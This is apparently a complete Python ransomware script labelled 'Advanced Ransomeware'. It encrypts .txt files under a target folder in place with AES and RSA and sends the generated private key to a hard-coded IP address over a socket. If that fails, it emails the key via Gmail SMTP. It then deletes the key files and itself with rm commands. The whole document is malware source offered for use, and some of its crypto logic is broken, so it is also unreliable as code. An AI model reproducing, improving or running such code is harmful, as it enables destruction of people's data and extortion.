# Advanced Ransomeware
import os
import socket
import hashlib
from threading import Thread
from Crypto.Cipher import AES
from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA
import smtplib
import getpass
import sys

if os.getuid() != 0:
	print("[-] run this program as root")
	sys.exit()

encrypted_ext = ('.txt',)

file_paths = []
for root, dir, files in os.walk('/root/Desktop/test'):
	for file in files:
		file_path, file_ext = os.path.splitext(root+'/'+file)
		if file_ext in encrypted_ext:
			file_paths.append(root+'/'+file)



def pad_files(files):
	while len(files) % 16 != 0:
		files = files + b"0"
	return files

def fsociety():
	
	password = b"fsocietyencryptingtheworld"
	
	keyAES = hashlib.sha256(password).digest()
	
	IV = 'ThisisanIV456aaa'.encode()
	
	cipher = AES.new(keyAES,AES.MODE_CBC,IV)
	
	for file in file_paths:
	
		print(f"[*] Encrypting {file} with AES ")
		
		with open(file, 'rb') as f:
		
			data = f.read()
		
			padded_file = pad_files(data)
		
		with open(file, 'wb') as en:
		
			encrypted_data = cipher.encrypt(padded_file)
		
			en.write(encrypted_data)



	keyRSA = RSA.importKey(open('public.pem').read())

	cipher = PKCS1_OAEP.new(keyRSA)


	for file in file_paths:

		print(f'[*] Encrypting {file} with RSA ')

		with open(file, 'rb') as ef:

			data = ef.read()

		with open(file, 'wb') as e:

			encrypted = cipher.encrypt(data)

			e.write(encrypted)



def rsa():
	key = RSA.generate(2048)
	private_key = key.export_key()
	file_out = open("private.pem", "wb")
	file_out.write(private_key)
	file_out.close()

	public_key = key.publickey().export_key()
	file_out = open("public.pem", "wb")
	file_out.write(public_key)
	file_out.close()


def sender():
	try:
		pk =  open('private.pem', 'r')
		data = pk.read().encode()
		
		ip = "192.168.1.5"
		port = 65300
		with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
			s.connect((ip, port))
			print("[*] connection established successfully sending data ")
			s.send(data)
	except:
		pass
		pk0 =  open('private.pem', 'r')
		data0 = pk0.read()
		email = "<your email goes here>"
		password = getpass.getpass(prompt=f'passwordTo_{email}: ', stream=None)
		server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
		server.login(email, password)
		server.sendmail(email, email, data0)	

def destruct():
	os.system("rm private.pem")
	os.system("rm public.pem")
	os.system("rm ransomeware")

rsa()
fsociety()
sender()
destruct()